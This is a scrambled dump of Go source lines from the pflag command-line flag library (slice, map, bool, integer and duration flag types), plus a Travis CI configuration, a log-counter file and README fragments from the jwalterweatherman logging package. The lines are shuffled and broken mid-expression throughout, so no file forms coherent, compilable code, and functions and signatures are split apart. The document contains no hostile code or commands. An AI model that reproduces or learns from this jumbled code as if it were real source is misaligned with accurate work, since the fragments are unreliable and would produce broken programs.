"return """", err"
return ssv
"// StringSliceVar defines a string flag with specified name, default value, and usage string."
f.StringSliceVarP(
ssv.value = val
[]string {
"[]string, name string, value []string, usage string) {"
"""strings"""
"return strings.TrimSuffix(b.String(), """
// -- stringSlice Value
"if val == """" {"
func StringSliceVarP(p 
"CommandLine.VarP(newStringSliceValue(value, p), name, """", usage)"
"return CommandLine.StringSliceP(name, """", value, usage)"
w.Flush()
"func StringSlice(name string, value []string, usage string) "
value   
stringSliceValue {
w := csv.NewWriter(b)
package pflag
[]string
return err
"// StringSliceP is like StringSlice, but accepts a shorthand letter that can be used after a single dash."
} else {
"func writeAsCSV(vals []string) (string, error) {"
"return val.([]string), nil"
"str, _ := writeAsCSV("
p := []string{}
if err != nil {
"n""), nil"
"func stringSliceConv(sval string) (interface{}, error) {"
s.changed = true
"f.VarP(newStringSliceValue(value, p), name, """", usage)"
import (
"CommandLine.VarP(newStringSliceValue(value, p), name, shorthand, usage)"
b := 
"//   []string{""v1"", ""v2"", ""v3""}"
"func StringSliceP(name, shorthand string, value []string, usage string) "
"[]string, name, shorthand string, value []string, usage string) {"
"FlagSet) StringSliceP(name, shorthand string, value []string, usage string) "
"f.VarP(newStringSliceValue(value, p), name, shorthand, usage)"
if !s.changed {
"p, name, shorthand, value, usage)"
return csvReader.Read()
changed bool
if len(sval) == 0 {
"return CommandLine.StringSliceP(name, shorthand, value, usage)"
"FlagSet) StringSlice(name string, value []string, usage string) "
" ""]"""
// will result in
"// StringSliceVarP is like StringSliceVar, but accepts a shorthand letter that can be used after a single dash."
stringReader := strings.NewReader(val)
 str 
return 
ssv := new(stringSliceValue)
func (f 
"return []string{}, err"
"// StringSlice defines a string flag with specified name, default value, and usage string."
"p, name, """", value, usage)"
"// Compared to StringArray flags, StringSlice flags take comma-separated value as arguments and split them accordingly."
"v, err := readAsCSV(val)"
"val, err := f.getFlagType(name, ""stringSlice"", stringSliceConv)"
"s.value, v...)"
// The argument p points to a []string variable in which to store the value of the flag.
// GetStringSlice return the []string value of a flag with the given name
"return ""stringSlice"""
[]string) 
s.value = v
"//   --ss=""v1,v2"" -ss=""v3"""
func (s 
"return ""["" "
stringSliceValue) Set(val string) error {
"""encoding/csv"""
err := w.Write(vals)
ssv.value = p
// For example:
s.value)
func StringSliceVar(p 
s.value = append(
"func readAsCSV(val string) ([]string, error) {"
  - verify/all.sh -v
  allow_failures:
  - export PATH=$GOPATH/bin:$PATH
  - 1.7.3
script:
language: go
sudo: false
matrix:
  - go install ./...
  - go test ./...
install:
  - go get github.com/golang/lint/golint
  - 1.8.1
    - go: tip
  - tip
buf.WriteString(strconv.Itoa(v))
if i > 0 {
"// Format: a=1,b=2"
var err error
"func newStringToIntValue(val map[string]int, p "
buf.WriteRune('=')
return nil
FlagSet) StringToIntVar(p 
"CommandLine.VarP(newStringToIntValue(value, p), name, """", usage)"
"ss := strings.Split(val, "","")"
"return out, nil"
"""bytes"""
func StringToIntVarP(p 
"val, err := f.getFlagType(name, ""stringToInt"", stringToIntConv)"
return ssv
FlagSet) StringToIntVarP(p 
ssv.value = val
"""strconv"""
map[string]int {
"f.VarP(newStringToIntValue(value, p), name, shorthand, usage)"
"""strings"""
"func stringToIntConv(val string) (interface{}, error) {"
map[string]int
stringToIntValue) String() string {
stringToIntValue) Type() string {
"return map[string]int{}, err"
"// StringToIntP is like StringToInt, but accepts a shorthand letter that can be used after a single dash."
value   
"FlagSet) GetStringToInt(name string) (map[string]int, error) {"
"for _, pair := range ss {"
"func StringToInt(name string, value map[string]int, usage string) "
package pflag
stringToIntValue {
// -- stringToInt Value
"out[kv[0]], err = strconv.Atoi(kv[1])"
"map[string]int, name string, value map[string]int, usage string) {"
return err
// The argument p points to a map[string]int variable in which to store the value of the flag.
func StringToIntVar(p 
} else {
"FlagSet) StringToIntP(name, shorthand string, value map[string]int, usage string) "
"f.VarP(newStringToIntValue(value, p), name, """", usage)"
if len(val) == 0 {
if len(kv) != 2 {
if err != nil {
"return CommandLine.StringToIntP(name, shorthand, value, usage)"
p := map[string]int{}
s.changed = true
"return map[string]int{}, nil"
var buf bytes.Buffer
"""fmt"""
 buf.String() 
import (
"map[string]int, name, shorthand string, value map[string]int, usage string) {"
// GetStringToInt return the map[string]int value of a flag with the given name
"FlagSet) StringToInt(name string, value map[string]int, usage string) "
"// StringToInt defines a string flag with specified name, default value, and usage string."
map[string]int) 
if !s.changed {
"for k, v := range out {"
"p, name, shorthand, value, usage)"
"buf.WriteRune(',')"
changed bool
type stringToIntValue struct {
s.value {
" ""]"""
"return fmt.Errorf(""%s must be formatted as key=value"", pair)"
return 
func (f 
"return ""stringToInt"""
"return nil, err"
"// StringToIntVar defines a string flag with specified name, default value, and usage string."
"p, name, """", value, usage)"
s.value = out
"func StringToIntP(name, shorthand string, value map[string]int, usage string) "
"out := make(map[string]int, len(ss))"
// The value of each argument will not try to be separated by comma
"return val.(map[string]int), nil"
stringToIntValue) Set(val string) error {
"CommandLine.VarP(newStringToIntValue(value, p), name, shorthand, usage)"
"for k, v := range "
s.value)[k] = v
func (s 
// The return value is the address of a map[string]int variable that stores the value of the flag.
// The argument p points to a map[string]int variable in which to store the values of the multiple flags.
"return CommandLine.StringToIntP(name, """", value, usage)"
buf.WriteString(k)
"return ""["" "
"// StringToIntVarP is like StringToIntVar, but accepts a shorthand letter that can be used after a single dash."
"return nil, fmt.Errorf(""%s must be formatted as key=value"", pair)"
ssv := new(stringToIntValue)
ssv.value = p
"val = strings.Trim(val, ""[]"")"
"kv := strings.SplitN(pair, ""="", 2)"
f.StringToIntVarP(
i := 0
// An empty string would cause an empty map
// The return value is the address of a []int variable that stores the value of the flag.
FlagSet) IntSliceVarP(p 
"// IntSliceP is like IntSlice, but accepts a shorthand letter that can be used after a single dash."
var err error
"// IntSliceVar defines a int[] flag with specified name, default value, and usage string."
return nil
f.IntSliceVarP(
"ss := strings.Split(val, "","")"
"return out, nil"
"return []int{}, err"
"func newIntSliceValue(val []int, p "
// -- intSlice Value
" strings.Join(out, "","") "
[]int) 
"""strconv"""
intSliceValue {
"return ""intSlice"""
"""strings"""
"CommandLine.VarP(newIntSliceValue(value, p), name, """", usage)"
"[]int, name string, value []int, usage string) {"
// Empty string would cause a slice with one (empty) entry
value   
"out[i] = fmt.Sprintf(""%d"", d)"
package pflag
intSliceValue) String() string {
"return []int{}, nil"
isv.value = val
return err
"// IntSliceVar defines a intSlice flag with specified name, default value, and usage string."
"// IntSlice defines a []int flag with specified name, default value, and usage string."
} else {
FlagSet) IntSliceVar(p 
if len(val) == 0 {
if err != nil {
"func IntSlice(name string, value []int, usage string) "
s.changed = true
s.value))
"""fmt"""
import (
type intSliceValue struct {
p := []int{}
intSliceValue) Set(val string) error {
"for i, d := range ss {"
"func IntSliceP(name, shorthand string, value []int, usage string) "
"return CommandLine.IntSliceP(name, shorthand, value, usage)"
"// IntSliceVarP is like IntSliceVar, but accepts a shorthand letter that can be used after a single dash."
if !s.changed {
"p, name, shorthand, value, usage)"
"out[i], err = strconv.Atoi(d)"
"FlagSet) IntSlice(name string, value []int, usage string) "
"[]int, name, shorthand string, value []int, usage string) {"
"CommandLine.VarP(newIntSliceValue(value, p), name, shorthand, usage)"
changed bool
"func intSliceConv(val string) (interface{}, error) {"
s.value {
" ""]"""
"val, err := f.getFlagType(name, ""intSlice"", intSliceConv)"
func IntSliceVar(p 
// The argument p points to a []int variable in which to store the value of the flag.
return 
"FlagSet) IntSliceP(name, shorthand string, value []int, usage string) "
func (f 
"return nil, err"
"p, name, """", value, usage)"
return isv
s.value = out
isv.value = p
"FlagSet) GetIntSlice(name string) ([]int, error) {"
// The argument p points to a int[] variable in which to store the value of the flag.
func IntSliceVarP(p 
[]int {
"return val.([]int), nil"
"out := make([]string, len("
"f.VarP(newIntSliceValue(value, p), name, shorthand, usage)"
// GetIntSlice return the []int value of a flag with the given name
"f.VarP(newIntSliceValue(value, p), name, """", usage)"
"out := make([]int, len(ss))"
"for i, d := range "
func (s 
"return ""["" "
"val = strings.Trim(val, ""[]"")"
"return CommandLine.IntSliceP(name, """", value, usage)"
isv := new(intSliceValue)
s.value = append(
"s.value, out...)"
intSliceValue) Type() string {
[]int
// GetBoolSlice returns the []bool value of a flag with the given name.
var err error
"FlagSet) BoolSlice(name string, value []bool, usage string) "
// The return value is the address of a []bool variable that stores the value of the flag.
return nil
"ss := strings.Split(val, "","")"
"return out, nil"
""", """")"
// The argument p points to a []bool variable in which to store the value of the flag.
"""strconv"""
return bsv
"out[i], err = strconv.ParseBool(t)"
[]bool
 out 
"""strings"""
"func newBoolSliceValue(val []bool, p "
"// BoolSliceP is like BoolSlice, but accepts a shorthand letter that can be used after a single dash."
"return CommandLine.BoolSliceP(name, """", value, usage)"
"FlagSet) GetBoolSlice(name string) ([]bool, error) {"
// Empty string would cause a slice with one (empty) entry
bsv := new(boolSliceValue)
p := []bool{}
"return []bool{}, err"
// read flag arguments with CSV parser
value   
"// If Set is called on a flag that already has a []bool assigned, the newly converted values will be appended."
package pflag
"val, err := f.getFlagType(name, ""boolSlice"", boolSliceConv)"
boolSliceValue) String() string {
if err != nil 
"// Set converts, and assigns, the comma-separated boolean argument string representation as the []bool value of this flag."
"CommandLine.VarP(newBoolSliceValue(value, p), name, """", usage)"
"// BoolSliceVarP is like BoolSliceVar, but accepts a shorthand letter that can be used after a single dash."
"func boolSliceConv(val string) (interface{}, error) {"
rmQuote := strings.NewReplacer(
return err
} else {
"out = append(out, b)"
if len(val) == 0 {
"// String defines a ""native"" format for this boolean slice flag value."
FlagSet) BoolSliceVar(p 
if err != nil {
boolStrSlice[i] = strconv.FormatBool(b)
"for i, t := range ss {"
"for _, boolStr := range boolStrSlice {"
bsv.value = p
s.changed = true
s.value))
func BoolSliceVar(p 
import (
"return ""boolSlice"""
"func BoolSliceP(name, shorthand string, value []bool, usage string) "
 err != io.EOF {
// remove all quote characters
// Type returns a string that uniquely represents this flag's type.
"out := make([]bool, len(ss))"
"out := make([]bool, 0, len(boolStrSlice))"
", """", "
"// BoolSlice defines a []bool flag with specified name, default value, and usage string."
bsv.value = val
"f.VarP(newBoolSliceValue(value, p), name, shorthand, usage)"
if !s.changed {
"p, name, shorthand, value, usage)"
changed bool
[]bool) 
s.value {
"return CommandLine.BoolSliceP(name, shorthand, value, usage)"
" ""]"""
"return val.([]bool), nil"
// parse boolean values into slice
// -- boolSlice Value
"boolStrSlice, err := readAsCSV(rmQuote.Replace(val))"
"f.VarP(newBoolSliceValue(value, p), name, """", usage)"
"// BoolSliceVar defines a boolSlice flag with specified name, default value, and usage string."
return 
"[]bool, name, shorthand string, value []bool, usage string) {"
func (f 
"// BoolSliceVar defines a []bool flag with specified name, default value, and usage string."
"func BoolSlice(name string, value []bool, usage string) "
"return nil, err"
"p, name, """", value, usage)"
s.value = out
boolSliceValue) Set(val string) error {
f.BoolSliceVarP(
"FlagSet) BoolSliceP(name, shorthand string, value []bool, usage string) "
[]bool {
func BoolSliceVarP(p 
"""io"""
boolSliceValue {
"[]bool, name string, value []bool, usage string) {"
boolSliceValue) Type() string {
FlagSet) BoolSliceVarP(p 
"boolStrSlice := make([]string, len("
func (s 
"b, err := strconv.ParseBool(strings.TrimSpace(boolStr))"
"CommandLine.VarP(newBoolSliceValue(value, p), name, shorthand, usage)"
"return ""["" "
"val = strings.Trim(val, ""[]"")"
type boolSliceValue struct {
"out, _ := writeAsCSV(boolStrSlice)"
s.value = append(
"s.value, out...)"
"for i, b := range "
"return []bool{}, nil"
", """", """
"val, err := f.getFlagType(name, ""bool"", boolConv)"
"return false, err"
boolValue) String() string { return strconv.FormatBool(bool(
"return BoolP(name, """", value, usage)"
// -- bool Value
b)) }
"bool, name, shorthand string, value bool, usage string) {"
p := new(bool)
boolValue) Type() string {
"return f.BoolP(name, """", value, usage)"
"FlagSet) GetBool(name string) (bool, error) {"
boolValue)(p)
IsBoolFlag() bool
func BoolVarP(p 
"func newBoolValue(val bool, p "
"flag := f.VarPF(newBoolValue(value, p), name, shorthand, usage)"
"func BoolP(name, shorthand string, value bool, usage string) "
"bool, name string, value bool, usage string) {"
"return ""bool"""
return b
"BoolVarP(p, name, """", value, usage)"
Value
"// BoolVar defines a bool flag with specified name, default value, and usage string."
p = val
"func boolConv(sval string) (interface{}, error) {"
"flag.NoOptDefVal = ""true"""
"f.BoolVarP(p, name, """", value, usage)"
FlagSet) BoolVarP(p 
bool {
"// BoolP is like Bool, but accepts a shorthand letter that can be used after a single dash."
type boolValue bool
bool) 
// The argument p points to a bool variable in which to store the value of the flag.
package pflag
"f.BoolVarP(p, name, shorthand, value, usage)"
"func Bool(name string, value bool, usage string) "
type boolFlag interface {
"FlagSet) Bool(name string, value bool, usage string) "
"FlagSet) BoolP(name, shorthand string, value bool, usage string) "
"// supplied without ""=value"" text"
boolValue) Set(s string) error {
FlagSet) BoolVar(p 
func (b 
return err
"return val.(bool), nil"
func BoolVar(p 
return strconv.ParseBool(sval)
"// Bool defines a bool flag with specified name, default value, and usage string."
boolValue {
// GetBool return the bool value of a flag with the given name
return (
// The return value is the address of a bool variable that stores the value of the flag.
"b := CommandLine.BoolP(name, shorthand, value, usage)"
"import ""strconv"""
if err != nil {
boolValue) IsBoolFlag() bool { return true }
"v, err := strconv.ParseBool(s)"
return p
"// BoolVarP is like BoolVar, but accepts a shorthand letter that can be used after a single dash."
"flag := CommandLine.VarPF(newBoolValue(value, p), name, shorthand, usage)"
b = boolValue(v)
// optional interface to indicate boolean flags that can be
func (f 
// The argument p points to an int64 variable in which to store the value of the flag.
"return val.(int64), nil"
FlagSet) Int64Var(p 
"// Int64VarP is like Int64Var, but accepts a shorthand letter that can be used after a single dash."
"func int64Conv(sval string) (interface{}, error) {"
type int64Value int64
int64Value) String() string { return strconv.FormatInt(int64(
"func newInt64Value(val int64, p "
// GetInt64 return the int64 value of a flag with the given name
"return strconv.ParseInt(sval, 0, 64)"
"f.VarP(newInt64Value(value, p), name, """", usage)"
"return ""int64"""
"int64, name string, value int64, usage string) {"
FlagSet) Int64VarP(p 
func Int64Var(p 
"CommandLine.VarP(newInt64Value(value, p), name, """", usage)"
p = val
"f.Int64VarP(p, name, shorthand, value, usage)"
"func Int64P(name, shorthand string, value int64, usage string) "
package pflag
func (i 
"int64, name, shorthand string, value int64, usage string) {"
"return 0, err"
"FlagSet) GetInt64(name string) (int64, error) {"
"return CommandLine.Int64P(name, shorthand, value, usage)"
func Int64VarP(p 
int64Value) Type() string {
i = int64Value(v)
int64Value)(p)
"func Int64(name string, value int64, usage string) "
"f.Int64VarP(p, name, """", value, usage)"
"// Int64P is like Int64, but accepts a shorthand letter that can be used after a single dash."
"FlagSet) Int64(name string, value int64, usage string) "
p := new(int64)
return err
int64) 
"val, err := f.getFlagType(name, ""int64"", int64Conv)"
// The return value is the address of an int64 variable that stores the value of the flag.
"// Int64 defines an int64 flag with specified name, default value, and usage string."
"f.VarP(newInt64Value(value, p), name, shorthand, usage)"
return (
"// Int64Var defines an int64 flag with specified name, default value, and usage string."
"return CommandLine.Int64P(name, """", value, usage)"
int64Value {
"import ""strconv"""
if err != nil {
"CommandLine.VarP(newInt64Value(value, p), name, shorthand, usage)"
int64 {
"FlagSet) Int64P(name, shorthand string, value int64, usage string) "
"i), 10) }"
return p
int64Value) Set(s string) error {
// -- int64 Value
"v, err := strconv.ParseInt(s, 0, 64)"
func (f 
func UintSliceVarP(p 
"FlagSet) UintSliceP(name, shorthand string, value []uint, usage string) "
// The argument p points to a uint[] variable in which to store the value of the flag.
"CommandLine.VarP(newUintSliceValue(value, p), name, shorthand, usage)"
uisv.value = p
"// UintSlice defines a []uint flag with specified name, default value, and usage string."
return nil
"func UintSliceP(name, shorthand string, value []uint, usage string) "
"ss := strings.Split(val, "","")"
"return out, nil"
func UintSliceVar(p 
// The return value is the address of a []uint variable that stores the value of the flag.
"func newUintSliceValue(val []uint, p "
" strings.Join(out, "","") "
"""strconv"""
uintSliceValue {
FlagSet) UintSliceVarP(p 
"""strings"""
"FlagSet) GetUintSlice(name string) ([]uint, error) {"
"// UintSliceVar defines a uint[] flag with specified name, default value, and usage string."
// Empty string would cause a slice with one (empty) entry
out[i] = uint(u)
"// UintSliceVarP is like UintSliceVar, but accepts a shorthand letter that can be used after a single dash."
value   
"return val.([]uint), nil"
"out[i] = fmt.Sprintf(""%d"", d)"
package pflag
[]uint {
[]uint
return err
} else {
[]uint) 
"func uintSliceConv(val string) (interface{}, error) {"
if len(val) == 0 {
"FlagSet) UintSlice(name string, value []uint, usage string) "
if err != nil {
"return CommandLine.UintSliceP(name, shorthand, value, usage)"
s.changed = true
s.value))
"""fmt"""
uintSliceValue) Set(val string) error {
"[]uint, name, shorthand string, value []uint, usage string) {"
import (
"[]uint, name string, value []uint, usage string) {"
"u, err := strconv.ParseUint(d, 10, 0)"
uintSliceValue) String() string {
type uintSliceValue struct {
FlagSet) UintSliceVar(p 
uisv.value = val
"for i, d := range ss {"
"val, err := f.getFlagType(name, ""uintSlice"", uintSliceConv)"
return uisv
if !s.changed {
"p, name, shorthand, value, usage)"
"return []uint{}, err"
changed bool
// -- uintSlice Value
"// UintSliceVarP is like the UintSliceVar, but accepts a shorthand letter that can be used after a single dash."
s.value {
" ""]"""
f.UintSliceVarP(
return 
func (f 
"return nil, err"
"f.VarP(newUintSliceValue(value, p), name, shorthand, usage)"
"func UintSlice(name string, value []uint, usage string) "
"p, name, """", value, usage)"
"// UintSliceVar defines a uintSlice flag with specified name, default value, and usage string."
"// UintSliceP is like UintSlice, but accepts a shorthand letter that can be used after a single dash."
s.value = out
"return []uint{}, nil"
// GetUintSlice returns the []uint value of a flag with the given name.
"return ""uintSlice"""
"out := make([]string, len("
// The argument p points to a []uint variable in which to store the value of the flag.
"f.VarP(newUintSliceValue(value, p), name, """", usage)"
p := []uint{}
uisv := new(uintSliceValue)
"for i, d := range "
func (s 
uintSliceValue) Type() string {
"return ""["" "
"val = strings.Trim(val, ""[]"")"
"out := make([]uint, len(ss))"
s.value = append(
"s.value, out...)"
"return CommandLine.UintSliceP(name, """", value, usage)"
"CommandLine.VarP(newUintSliceValue(value, p), name, """", usage)"
// The return value is the address of a uint  variable that stores the value of the flag.
"f.VarP(newUintValue(value, p), name, shorthand, usage)"
uintValue) String() string { return strconv.FormatUint(uint64(
"CommandLine.VarP(newUintValue(value, p), name, shorthand, usage)"
"v, err := strconv.ParseUint(sval, 0, 0)"
func UintVar(p 
"func newUintValue(val uint, p "
"func UintP(name, shorthand string, value uint, usage string) "
"return uint(v), nil"
"FlagSet) Uint(name string, value uint, usage string) "
"return CommandLine.UintP(name, """", value, usage)"
// The argument p points to a uint variable in which to store the value of the flag.
p = val
FlagSet) UintVarP(p 
"func Uint(name string, value uint, usage string) "
"return CommandLine.UintP(name, shorthand, value, usage)"
uintValue) Type() string {
"f.UintVarP(p, name, shorthand, value, usage)"
"return ""uint"""
package pflag
uintValue)(p)
func (i 
"return 0, err"
uint {
uintValue {
type uintValue uint
uint) 
"CommandLine.VarP(newUintValue(value, p), name, """", usage)"
// GetUint return the uint value of a flag with the given name
func UintVarP(p 
uintValue) Set(s string) error {
"val, err := f.getFlagType(name, ""uint"", uintConv)"
"// UintVar defines a uint flag with specified name, default value, and usage string."
"FlagSet) GetUint(name string) (uint, error) {"
"f.VarP(newUintValue(value, p), name, """", usage)"
"f.UintVarP(p, name, """", value, usage)"
return err
"// UintVarP is like UintVar, but accepts a shorthand letter that can be used after a single dash."
"uint, name, shorthand string, value uint, usage string) {"
"return val.(uint), nil"
"// Uint defines a uint flag with specified name, default value, and usage string."
"// UintP is like Uint, but accepts a shorthand letter that can be used after a single dash."
"v, err := strconv.ParseUint(s, 0, 64)"
p := new(uint)
"FlagSet) UintP(name, shorthand string, value uint, usage string) "
"uint, name string, value uint, usage string) {"
return (
FlagSet) UintVar(p 
"import ""strconv"""
if err != nil {
"i), 10) }"
// -- uint Value
// The argument p points to a uint  variable in which to store the value of the flag.
"func uintConv(sval string) (interface{}, error) {"
return p
i = uintValue(v)
func (f 
"return CommandLine.StringToStringP(name, """", value, usage)"
"return val.(map[string]string), nil"
"return fmt.Errorf(""%s must be formatted as key=value"", val)"
 strings.TrimSpace(buf.String()) 
"// Format: a=1,b=2"
"func StringToString(name string, value map[string]string, usage string) "
panic(err)
f.StringToStringVarP(
var err error
"f.VarP(newStringToStringValue(value, p), name, """", usage)"
"return map[string]string{}, err"
default:
out[kv[0]] = kv[1]
ssv := new(stringToStringValue)
var ss []string
"// StringToStringVar defines a string flag with specified name, default value, and usage string."
return nil
"return out, nil"
"""bytes"""
return ssv
"n := strings.Count(val, ""="")"
ssv.value = val
"records := make([]string, 0, len("
p := map[string]string{}
case 1:
"""strings"""
w := csv.NewWriter(
"ss = append(ss, strings.Trim(val, "
"map[string]string, name, shorthand string, value map[string]string, usage string) {"
FlagSet) StringToStringVar(p 
stringToStringValue) Type() string {
map[string]string
w.Flush()
value   
buf)
"func stringToStringConv(val string) (interface{}, error) {"
"for _, pair := range ss {"
package pflag
 err != nil {
"return ""stringToString"""
return err
"// StringToString defines a string flag with specified name, default value, and usage string."
type stringToStringValue struct {
} else {
stringToStringValue {
if len(val) == 0 {
if len(kv) != 2 {
"val, err := f.getFlagType(name, ""stringToString"", stringToStringConv)"
if err != nil {
// The return value is the address of a map[string]string variable that stores the value of the flag.
"records = append(records, k"
s.changed = true
var buf bytes.Buffer
"""fmt"""
import (
"CommandLine.VarP(newStringToStringValue(value, p), name, """", usage)"
s.value)>>1)
func StringToStringVarP(p 
"FlagSet) StringToStringP(name, shorthand string, value map[string]string, usage string) "
"CommandLine.VarP(newStringToStringValue(value, p), name, shorthand, usage)"
"f.VarP(newStringToStringValue(value, p), name, shorthand, usage)"
map[string]string) 
"FlagSet) StringToString(name string, value map[string]string, usage string) "
// The argument p points to a map[string]string variable in which to store the value of the flag.
"for k, v := range out {"
if !s.changed {
"p, name, shorthand, value, usage)"
changed bool
if err := w.Write(records)
switch n {
s.value {
r := csv.NewReader(strings.NewReader(val))
" ""]"""
"FlagSet) GetStringToString(name string) (map[string]string, error) {"
"return fmt.Errorf(""%s must be formatted as key=value"", pair)"
"ss, err = r.Read()"
stringToStringValue) Set(val string) error {
return 
func (f 
"return nil, err"
"p, name, """", value, usage)"
map[string]string {
stringToStringValue) String() string {
s.value = out
"func StringToStringP(name, shorthand string, value map[string]string, usage string) "
"ss, err := r.Read()"
// The value of each argument will not try to be separated by comma
func StringToStringVar(p 
"// StringToStringP is like StringToString, but accepts a shorthand letter that can be used after a single dash."
"map[string]string, name string, value map[string]string, usage string) {"
"for k, v := range "
// GetStringToString return the map[string]string value of a flag with the given name
"// StringToStringVarP is like StringToStringVar, but accepts a shorthand letter that can be used after a single dash."
// The argument p points to a map[string]string variable in which to store the values of the multiple flags.
s.value)[k] = v
func (s 
"return CommandLine.StringToStringP(name, shorthand, value, usage)"
// -- stringToString Value
"return ""["" "
"out := make(map[string]string, len(ss))"
"func newStringToStringValue(val map[string]string, p "
"return nil, fmt.Errorf(""%s must be formatted as key=value"", pair)"
"""encoding/csv"""
ssv.value = p
"val = strings.Trim(val, ""[]"")"
FlagSet) StringToStringVarP(p 
"kv := strings.SplitN(pair, ""="", 2)"
// An empty string would cause an empty map
case 0:
"return map[string]string{}, nil"
"return CommandLine.DurationP(name, """", value, usage)"
"// Duration defines a time.Duration flag with specified name, default value, and usage string."
"FlagSet) DurationP(name, shorthand string, value time.Duration, usage string) "
"func durationConv(sval string) (interface{}, error) {"
import (
"f.VarP(newDurationValue(value, p), name, """", usage)"
time.Duration) 
time.Duration)(d).String() }
type durationValue time.Duration
durationValue) Set(s string) error {
// GetDuration return the duration value of a flag with the given name
"// DurationP is like Duration, but accepts a shorthand letter that can be used after a single dash."
durationValue {
"return val.(time.Duration), nil"
"return ""duration"""
"FlagSet) Duration(name string, value time.Duration, usage string) "
// -- time.Duration Value
p = val
"f.DurationVarP(p, name, """", value, usage)"
durationValue) String() string { return (
package pflag
"CommandLine.VarP(newDurationValue(value, p), name, """", usage)"
"return 0, err"
"time.Duration, name, shorthand string, value time.Duration, usage string) {"
FlagSet) DurationVarP(p 
time.Duration {
"return CommandLine.DurationP(name, shorthand, value, usage)"
"FlagSet) GetDuration(name string) (time.Duration, error) {"
FlagSet) DurationVar(p 
durationValue)(p)
return time.ParseDuration(sval)
func DurationVarP(p 
"CommandLine.VarP(newDurationValue(value, p), name, shorthand, usage)"
"func Duration(name string, value time.Duration, usage string) "
return err
"// DurationVar defines a time.Duration flag with specified name, default value, and usage string."
"val, err := f.getFlagType(name, ""duration"", durationConv)"
"func newDurationValue(val time.Duration, p "
"func DurationP(name, shorthand string, value time.Duration, usage string) "
"v, err := time.ParseDuration(s)"
"f.DurationVarP(p, name, shorthand, value, usage)"
func (d 
"time.Duration, name string, value time.Duration, usage string) {"
"f.VarP(newDurationValue(value, p), name, shorthand, usage)"
func DurationVar(p 
p := new(time.Duration)
d = durationValue(v)
// The argument p points to a time.Duration variable in which to store the value of the flag.
return (
// The return value is the address of a time.Duration variable that stores the value of the flag.
"""time"""
if err != nil {
return p
durationValue) Type() string {
"// DurationVarP is like DurationVar, but accepts a shorthand letter that can be used after a single dash."
func (f 
stringArrayValue {
"return []string{}, err"
// An empty string would cause a array with one (empty) string
"// StringArrayP is like StringArray, but accepts a shorthand letter that can be used after a single dash."
func StringArrayVar(p 
"FlagSet) StringArray(name string, value []string, usage string) "
"FlagSet) StringArrayP(name, shorthand string, value []string, usage string) "
"return ""stringArray"""
"p, name, """", value, usage)"
"val, err := f.getFlagType(name, ""stringArray"", stringArrayConv)"
"s.value, val)"
return readAsCSV(sval)
"return CommandLine.StringArrayP(name, shorthand, value, usage)"
"// StringArrayVar defines a string flag with specified name, default value, and usage string."
"CommandLine.VarP(newStringArrayValue(value, p), name, shorthand, usage)"
"return CommandLine.StringArrayP(name, """", value, usage)"
// The argument p points to a []string variable in which to store the value of the flag.
value   
func StringArrayVarP(p 
// The return value is the address of a []string variable that stores the value of the flag.
"[]string, name, shorthand string, value []string, usage string) {"
f.StringArrayVarP(
type stringArrayValue struct {
ssv := new(stringArrayValue)
[]string) 
"return []string{}, nil"
"f.VarP(newStringArrayValue(value, p), name, """", usage)"
package pflag
"CommandLine.VarP(newStringArrayValue(value, p), name, """", usage)"
"// StringArray defines a string flag with specified name, default value, and usage string."
sval = sval[1 : len(sval)-1]
s.value = []string{val}
return nil
[]string
// -- stringArray Value
stringArrayValue) String() string {
"func stringArrayConv(sval string) (interface{}, error) {"
if !s.changed {
"p, name, shorthand, value, usage)"
return ssv
func (s 
// The value of each argument will not try to be separated by comma. Use a StringSlice for that.
changed bool
"func StringArray(name string, value []string, usage string) "
} else {
"func StringArrayP(name, shorthand string, value []string, usage string) "
"return ""["" "
if len(sval) == 0 {
"// StringArrayVarP is like StringArrayVar, but accepts a shorthand letter that can be used after a single dash."
"f.VarP(newStringArrayValue(value, p), name, shorthand, usage)"
ssv.value = val
"return val.([]string), nil"
ssv.value = p
" ""]"""
FlagSet) StringArrayVarP(p 
"func newStringArrayValue(val []string, p "
stringArrayValue) Type() string {
s.value)
[]string {
stringArrayValue) Set(val string) error {
"str, _ := writeAsCSV("
// GetStringArray return the []string value of a flag with the given name
if err != nil {
s.value = append(
"[]string, name string, value []string, usage string) {"
p := []string{}
return 
 str 
// The argument p points to a []string variable in which to store the values of the multiple flags.
"FlagSet) GetStringArray(name string) ([]string, error) {"
FlagSet) StringArrayVar(p 
s.changed = true
func (f 
"for _, np := range n.logCounters {"
"c.counter, 1)"
import (
// LogCountForLevelsGreaterThanorEqualTo returns the number of log invocations
// Use of this source code is governed by an MIT-style
for i := int(threshold)
package jwalterweatherman
np.resetCounter()
func (n 
"return len(p), nil"
// Copyright 
// ResetLogCounters resets the invocation counters for all levels.
Notepad) LogCountForLevelsGreaterThanorEqualTo(threshold Threshold) uint64 {
= n.LogCountForLevel(Threshold(i))
"""sync/atomic"""
logCounter) resetCounter() {
Notepad) ResetLogCounters() {
// greater than or equal to a given threshold.
return n.logCounters[l].getCount()
func (c 
atomic.StoreUint64(
logCounter) getCount() uint64 {
"c.counter, 0)"
"logCounter) Write(p []byte) (n int, err error) {"
// LogCountForLevel returns the number of log invocations for a given threshold.
// license that can be found in the LICENSE file.
 i < len(n.logCounters)
type logCounter struct {
cnt 
var cnt uint64
Notepad) LogCountForLevel(l Threshold) uint64 {
 2016 Steve Francia <spf@spf13.com>.
c.incr()
return cnt
counter uint64
logCounter) incr() {
c.counter)
return atomic.LoadUint64(
atomic.AddUint64(
   which can be easily logged as well 
 Error and above is printed to the terminal (stdout)
    // important for the user. Under the default thresholds this will be
![and_that__s_why_you_always_leave_a_note_by_jonnyetc-d57q7um](https://cloud.githubusercontent.com/assets/173412/11002937/ccd01654-847d-11e5-828e-12ebaf582eaf.jpg)
        jww.WARN.Println(err2)
Under the default thresholds :
jWalterWeatherman
 More information
 Info goto /dev/null
"        // application, but it"
that you should be using all 7 levels. Pick the right set for your needs.
" Debug, Trace "
    // Information that
"notepad.WARN.Println(""Some warning"""")"
 FATAL
Seamless printing to the terminal (stdout) and logging to a io.Writer
    if Verbose {
 ERROR
        jww.SetLogThreshold(jww.LevelTrace)
NOTE: You can also use the library in a non-global setting by creating an instance of a Notebook:
verbosity.
    jww.SetLogOutput(customWriter) 
 Step 1. Use it
"s happening, but not very"
6. Not have any unnecessary initialization cruft. Just use it.
JWW can log to any 
4. Provide an easy mechanism (like fmt.Println) to print info to the user
5. Due to 2 
        jww.ERROR.Println(err)
(file) that
    ...
 TRACE
Graphic by [JonnyEtc](http://jonnyetc.deviantart.com/art/And-That-s-Why-You-Always-Leave-a-Note-315311422)
standard usage. Eg.
